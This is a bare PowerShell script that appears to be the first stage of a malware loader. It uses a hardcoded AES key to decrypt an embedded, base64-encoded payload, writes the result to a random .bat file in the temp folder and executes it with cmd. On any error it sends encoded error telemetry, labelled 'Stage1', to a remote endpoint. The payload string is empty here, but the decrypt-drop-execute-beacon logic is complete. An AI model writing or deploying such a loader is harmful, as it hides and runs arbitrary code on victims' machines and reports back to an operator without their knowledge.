
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Stop'

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls13

try {
    $keyHex = 'f40cb162834ed29f5c390d472725f001'
    $keyBytes = [byte[]]::new($keyHex.Length / 2)
    for ($i = 0; $i -lt $keyHex.Length; $i += 2) {
        $keyBytes[$i / 2] = [Convert]::ToByte($keyHex.Substring($i, 2), 16)
    }
    
    $encryptedData = ''
    $encryptedBytes = [System.Convert]::FromBase64String($encryptedData)
    
    $iv = $encryptedBytes[0..15]
    $ciphertext = $encryptedBytes[16..($encryptedBytes.Length - 1)]
    
    $cipher = [System.Security.Cryptography.Aes]::Create()
    $cipher.Key = $keyBytes
    $cipher.IV = $iv
    $cipher.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $cipher.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    
    $decryptor = $cipher.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
    $decryptedText = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
    
	$tempBat = "$env:TEMP\$(Get-Random).bat"
	$decryptedText | Out-File -FilePath $tempBat -Encoding ASCII
	& cmd /c $tempBat
    
} catch {
    $errorMsg = $_.Exception.Message
    try {
        $errorData = @{error=$errorMsg;stage="Stage1";ts=[DateTimeOffset]::UtcNow.ToUnixTimeSeconds()} | ConvertTo-Json -Compress
        $encodedError = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($errorData))
        Invoke-WebRequest -Uri "https://example.com/_err?data=$encodedError" -UseBasicParsing -Method GET -TimeoutSec 3 | Out-Null
    } catch {}
    Write-Host $errorMsg
}
